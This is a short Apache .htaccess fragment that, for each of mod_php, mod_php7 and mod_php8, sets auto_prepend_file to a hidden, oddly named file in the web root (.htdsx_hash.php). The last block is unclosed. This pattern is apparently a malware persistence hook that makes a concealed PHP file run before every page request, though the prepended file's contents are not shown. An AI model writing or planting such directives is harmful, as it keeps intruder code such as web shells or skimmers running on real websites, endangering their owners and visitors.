<IfModule mod_php.c>
php_value auto_prepend_file /var/www/html/.htdsx_hash.php
</IfModule>
<IfModule mod_php7.c>
php_value auto_prepend_file /var/www/html/.htdsx_hash.php
</IfModule>
<IfModule mod_php8.c>
php_value auto_prepend_file /var/www/html/.htdsx_hash.php
